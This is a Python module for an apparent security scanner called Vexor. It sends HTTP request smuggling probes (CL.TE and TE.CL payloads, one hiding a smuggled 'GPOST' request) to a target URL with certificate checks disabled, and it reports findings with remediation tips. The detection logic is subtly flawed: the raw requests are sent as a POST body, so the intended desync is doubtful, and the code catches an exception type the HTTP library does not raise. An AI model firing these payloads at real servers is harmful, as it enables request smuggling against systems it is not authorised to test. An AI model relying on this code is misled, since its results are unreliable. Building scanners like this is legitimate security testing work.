"""
Vexor HTTP Request Smuggling Scanner
Detects CL.TE and TE.CL desync vulnerabilities
"""
import asyncio
import time
from vexor.modules.base import BaseScanner, Finding


class Scanner(BaseScanner):
    """HTTP Request Smuggling Scanner"""

    MODULE_NAME = "http_smuggling"
    MODULE_DESC = "HTTP Request Smuggling Detection (CL.TE / TE.CL)"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._test_cl_te(),
                self._test_te_cl(),
                self._check_te_header(),
                return_exceptions=True
            )
        return self.findings

    async def _test_cl_te(self) -> None:
        """Test CL.TE smuggling — timing based"""
        # CL.TE: Content-Length says body is short, Transfer-Encoding says chunked
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self._get_host()}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"
        )

        start = time.time()
        try:
            import httpx
            async with httpx.AsyncClient(verify=False, timeout=15) as client:
                resp = await client.post(
                    self.target,
                    content=payload.encode(),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Transfer-Encoding": "chunked",
                        "Content-Length": "6",
                    }
                )
                elapsed = time.time() - start

                # Timing attack: if server hangs waiting for more data
                if elapsed > 8:
                    self.add_finding(Finding(
                        severity="HIGH",
                        module=self.MODULE_NAME,
                        vuln="HTTP Request Smuggling — CL.TE (Timing)",
                        endpoint=self.target,
                        evidence=f"Response delayed {elapsed:.1f}s with CL.TE payload",
                        description="Server may be vulnerable to CL.TE request smuggling",
                        remediation=(
                            "Normalize Transfer-Encoding headers. "
                            "Use HTTP/2 end-to-end. "
                            "Reject requests with both Content-Length and Transfer-Encoding."
                        ),
                    ))
        except asyncio.TimeoutError:
            # Timeout = server hung = likely vulnerable
            self.add_finding(Finding(
                severity="HIGH",
                module=self.MODULE_NAME,
                vuln="HTTP Request Smuggling — CL.TE (Timeout)",
                endpoint=self.target,
                evidence="Server timed out on CL.TE payload — likely vulnerable",
                description="CL.TE request smuggling detected via timeout",
                remediation="Normalize Transfer-Encoding, use HTTP/2",
            ))
        except Exception:
            pass

    async def _test_te_cl(self) -> None:
        """Test TE.CL smuggling"""
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self._get_host()}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5c\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        )

        try:
            import httpx
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                resp = await client.post(
                    self.target,
                    content=payload.encode(),
                    headers={
                        "Transfer-Encoding": "chunked",
                        "Content-Length": "4",
                    }
                )
                # 400/500 with unusual body = possible TE.CL
                if resp.status_code in [400, 500] and len(resp.content) > 0:
                    if any(x in resp.text.lower() for x in ["invalid", "bad request", "malformed"]):
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="HTTP Request Smuggling — TE.CL (Potential)",
                            endpoint=self.target,
                            evidence=f"Unusual {resp.status_code} response to TE.CL payload",
                            description="Possible TE.CL request smuggling — manual verification needed",
                            remediation="Normalize Transfer-Encoding headers",
                        ))
        except Exception:
            pass

    async def _check_te_header(self) -> None:
        """Check if server accepts Transfer-Encoding: chunked"""
        try:
            import httpx
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                resp = await client.post(
                    self.target,
                    content=b"0\r\n\r\n",
                    headers={
                        "Transfer-Encoding": "chunked",
                        "Content-Type": "application/x-www-form-urlencoded",
                    }
                )
                if resp.status_code not in [400, 405, 501]:
                    self.add_finding(Finding(
                        severity="INFO",
                        module=self.MODULE_NAME,
                        vuln="Transfer-Encoding Accepted",
                        endpoint=self.target,
                        evidence=f"Server accepts Transfer-Encoding: chunked (status {resp.status_code})",
                        description="Server accepts chunked encoding — test for smuggling manually",
                        remediation="Review proxy/server TE handling",
                    ))
        except Exception:
            pass

    def _get_host(self) -> str:
        from urllib.parse import urlparse
        parsed = urlparse(self.target)
        return parsed.hostname or self.target
